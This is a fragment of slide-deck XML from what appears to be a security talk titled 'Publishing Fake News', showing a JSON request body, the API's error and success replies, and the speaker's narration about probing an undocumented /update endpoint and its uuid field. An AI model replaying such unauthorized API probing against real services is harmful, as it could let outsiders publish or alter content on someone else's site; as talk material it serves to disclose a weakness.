        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;221;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="222" name="Google Shape;222;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="223" name="Google Shape;223;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="904400"/>
            <a:ext cx="8073300" cy="57189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b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> "500 Internal Server Error"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>need at least 2 bytes to base64 encode"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"streams" needs to be a base64 encoded array</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"streams": "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>W10=</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"uuid": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"title": "aaa",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"description": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"tags": [],</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"category": ""</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Google Shape;224;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="228" name="Shape 228"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="229" name="Google Shape;229;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;230;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="231" name="Google Shape;231;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="232" name="Google Shape;232;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="904400"/>
            <a:ext cx="8073300" cy="36480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b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> "200 OK"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>It worked? But what did it do? I had no idea what this API was doing</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>What about the /update endpoint? I was curious about the uuid field</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>I browsed their main sites and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>view-source</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
